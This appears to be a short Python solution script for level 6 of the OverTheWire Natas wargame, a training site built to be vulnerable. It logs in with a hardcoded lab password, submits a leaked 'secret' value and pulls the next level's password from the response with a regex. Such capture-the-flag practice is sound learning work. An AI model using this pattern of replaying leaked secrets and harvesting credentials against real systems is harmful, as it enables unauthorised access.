import requests
import re

username = "natas6"
password = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"
url = "http://natas6.natas.labs.overthewire.org/"

data = {"secret" : "FOEIUWGHFEEUHOFUOIU", "submit" : "submit"}

session = requests.Session()
response = session.post(url,auth=(username,password), data = data)
content = response.text
print(re.findall("The password for natas7 is (.*)",content)[0])
